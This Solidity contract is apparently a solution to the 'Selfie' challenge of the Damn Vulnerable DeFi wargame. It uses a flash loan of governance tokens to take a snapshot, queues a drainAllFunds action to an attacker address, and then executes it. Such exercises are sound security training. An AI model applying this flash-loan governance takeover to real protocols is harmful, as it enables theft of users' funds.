// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract Exploit {
    SimpleGovernance gov;
    SelfiePool pool;
    uint256 actionId;
    address attacker;

    constructor(address _gov, address _pool, address _attacker) {
        gov = SimpleGovernance(_gov);
        pool = SelfiePool(_pool);
        attacker = _attacker;
    }

    function exploit() external {
        pool.flashLoan(1500000e18);
    }

    function receiveTokens(address _token, uint256 borrowAmount) public {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
        assert(msg.sender == address(pool));
        token.snapshot();
        actionId = gov.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);
        token.transfer(msg.sender, borrowAmount);
    }

    function withdraw() external {
        gov.executeAction(actionId);
    }
}
